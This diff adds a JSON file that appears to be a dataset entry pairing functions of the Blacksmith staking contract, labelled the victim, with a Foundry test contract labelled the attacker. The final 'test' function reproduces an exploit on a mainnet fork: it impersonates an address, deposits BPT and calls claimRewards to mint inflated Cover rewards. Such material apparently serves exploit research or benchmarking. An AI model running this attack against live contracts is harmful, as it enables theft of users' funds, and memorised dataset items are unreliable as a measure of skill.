@@ -1,0 +1,142 @@
+[
+  {
+    "contract/interface": "Blacksmith",
+    "source_type": "victim_contract",
+    "function_name": "claimRewards",
+    "original_code": "  function claimRewards(address _lpToken) public override {\n    updatePool(_lpToken);\n\n    Pool memory pool = pools[_lpToken];\n    Miner storage miner = miners[_lpToken][msg.sender];\n    BonusToken memory bonusToken = bonusTokens[_lpToken];\n\n    _claimCoverRewards(pool, miner);\n    _claimBonus(bonusToken, miner);\n    // update writeoff to match current acc rewards & bonus per token\n    miner.rewardWriteoff = miner.amount.mul(pool.accRewardsPerToken).div(CAL_MULTIPLIER);\n    miner.bonusWriteoff = miner.amount.mul(bonusToken.accBonusPerToken).div(CAL_MULTIPLIER);\n  }\n\n  function claimRewardsForPools(address[] calldata _lpTokens) external override {\n    for (uint256 i = 0; i < _lpTokens.length; i++) {\n      claimRewards(_lpTokens[i]);\n    }\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Blacksmith",
+    "source_type": "victim_contract",
+    "function_name": "claimRewardsForPools",
+    "original_code": "  function claimRewardsForPools(address[] calldata _lpTokens) external override {\n    for (uint256 i = 0; i < _lpTokens.length; i++) {\n      claimRewards(_lpTokens[i]);\n    }\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Blacksmith",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "  function deposit(address _lpToken, uint256 _amount) external override {\n    require(block.timestamp >= START_TIME , \"Blacksmith: not started\");\n    require(_amount > 0, \"Blacksmith: amount is 0\");\n    Pool memory pool = pools[_lpToken];\n    require(pool.lastUpdatedAt > 0, \"Blacksmith: pool does not exists\");\n    require(IERC20(_lpToken).balanceOf(msg.sender) >= _amount, \"Blacksmith: insufficient balance\");\n    updatePool(_lpToken);\n\n    Miner storage miner = miners[_lpToken][msg.sender];\n    BonusToken memory bonusToken = bonusTokens[_lpToken];\n    _claimCoverRewards(pool, miner);\n    _claimBonus(bonusToken, miner);\n\n    miner.amount = miner.amount.add(_amount);\n    // update writeoff to match current acc rewards/bonus per token\n    miner.rewardWriteoff = miner.amount.mul(pool.accRewardsPerToken).div(CAL_MULTIPLIER);\n    miner.bonusWriteoff = miner.amount.mul(bonusToken.accBonusPerToken).div(CAL_MULTIPLIER);\n\n    IERC20(_lpToken).safeTransferFrom(msg.sender, address(this), _amount);\n    emit Deposit(msg.sender, _lpToken, _amount);\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Blacksmith",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "  function withdraw(address _lpToken, uint256 _amount) external override {\n    require(_amount > 0, \"Blacksmith: amount is 0\");\n    Miner storage miner = miners[_lpToken][msg.sender];\n    require(miner.amount >= _amount, \"Blacksmith: insufficient balance\");\n    updatePool(_lpToken);\n\n    Pool memory pool = pools[_lpToken];\n    BonusToken memory bonusToken = bonusTokens[_lpToken];\n    _claimCoverRewards(pool, miner);\n    _claimBonus(bonusToken, miner);\n\n    miner.amount = miner.amount.sub(_amount);\n    // update writeoff to match current acc rewards/bonus per token\n    miner.rewardWriteoff = miner.amount.mul(pool.accRewardsPerToken).div(CAL_MULTIPLIER);\n    miner.bonusWriteoff = miner.amount.mul(bonusToken.accBonusPerToken).div(CAL_MULTIPLIER);\n\n    _safeTransfer(_lpToken, _amount);\n    emit Withdraw(msg.sender, _lpToken, _amount);\n  }\n\n  /// @notice withdraw all without rewards\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "Cover",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "bpt",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "bs",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 11_542_309); // fork mainnet at block 11542309\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "test",
+    "original_code": "    function test() public {\n        cheat.prank(0x00007569643bc1709561ec2E86F385Df3759e5DD);\n        bs.deposit(address(bpt), 15_255_552_810_089_260_015_361);\n        emit log_named_uint(\"Deposit BPT\", 15_255_552_810_089_260_015_361);\n        cheat.prank(0x00007569643bc1709561ec2E86F385Df3759e5DD);\n        //bs.withdraw(address(bpt),12345678);\n        bs.claimRewards(address(bpt));\n        emit log_named_uint(\n            \"After claimRewards, Cover Balance\", Cover.balanceOf(0x00007569643bc1709561ec2E86F385Df3759e5DD)\n        );\n    }\n",
+    "description": ""
+  }
+]
